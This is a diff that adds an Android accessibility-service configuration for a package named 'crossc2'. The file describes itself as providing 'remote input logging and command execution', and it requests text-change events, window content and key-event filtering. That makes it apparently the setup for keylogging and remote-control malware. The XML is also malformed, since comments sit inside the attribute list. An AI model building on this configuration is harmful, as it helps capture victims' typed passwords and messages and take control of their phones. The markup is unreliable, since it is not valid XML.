@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:description="Provides remote input logging and command execution."
+    android:packageNames="com.example.crossc2" <!-- Optional: Restrict to specific packages -->
+    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged" <!-- Listen for text changes and window state changes -->
+    android:accessibilityFlags="flagReportViewIds|flagRequestEnhancedWebAccessibility"
+    android:canRetrieveWindowContent="true"
+    android:settingsActivity=".SettingsActivity" <!-- Optional: Link to a settings activity -->
+    android:notificationTimeout="100"
+    android:canRequestFilterKeyEvents="true" <!-- Can request to filter key events -->
+    android:canRequestTouchExplorationMode="false"
+    android:canPerformGestures="false"
+/>
